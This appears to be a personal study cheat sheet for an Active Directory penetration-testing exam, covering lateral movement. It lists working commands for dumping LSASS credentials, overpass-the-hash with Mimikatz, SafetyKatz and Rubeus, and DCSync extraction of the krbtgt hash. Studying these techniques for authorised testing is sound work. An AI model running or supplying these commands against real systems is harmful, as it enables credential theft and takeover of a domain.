---
tags:
  - lateral-movement
title:
  - Lateral Movement
---
#### [Extracting Credentials](https://www.alteredsecurity.com/post/fantastic-windows-logon-types-and-where-to-find-credentials-in-them) from LSASS

```batch title:"Using pypykatz (Mimikkatz functionality in Python)"
pypykatz.exe live lsa
```

```powershell title:"Get the process ID of lsass"
(Get-Process -ProcessName lsass).Id
```

```batch title:"Get the process ID of lsass"
tasklist /FI "IMAGENAME eq lsass.exe"
```

```batch title:"Using comsvcs.dll"
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full
```

#### OverPass-The-Hash

OPTH generate tokens from hashes or keys.

```powershell title:"Over Pass the hash (OPTH) generate tokens from hashes or keys. Needs admin privileges"
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:domain.name /aes256:<aes256key> /run:powershell.exe"'
```

```batch title:"alternative"
SafetyKatz.exe "sekurlsa::pth /user:Administrator /domain:domain.name /aes256:<aes256keys> /run:cmd.exe" "exit"
```

Commands start a PowerShell/cmd.exe session with a logon type 9 (same as `runas /netonly`)

```batch title:"Imports tgt to current shell, doesn't need elevation"
Rubeus.exe asktgt /user:Adminstrator /rc4:<ntlmhash> /ptt
```

```batch title:"Imports tgt to current shell, needs elevation"
Rubeus.exe asktgt /user:Adminstrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

#### DCSync

To extract credentials from the DC without code execution on it, we can use DCSync.

```powershell title:"Use DCSync rights to get the hash of the krbtgt account with Domain Admin privileges for a domain"
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
```

```batch title:"Use DCSync rights to get the hash of the krbtgt account with Domain Admin privileges for a domain"
SafetyKatz.exe "lsadump::dcsync /user:domain\krbtgt" "exit"
```

By default, Domain Admin privileges are required to run DCSync, but during the exam please verify.


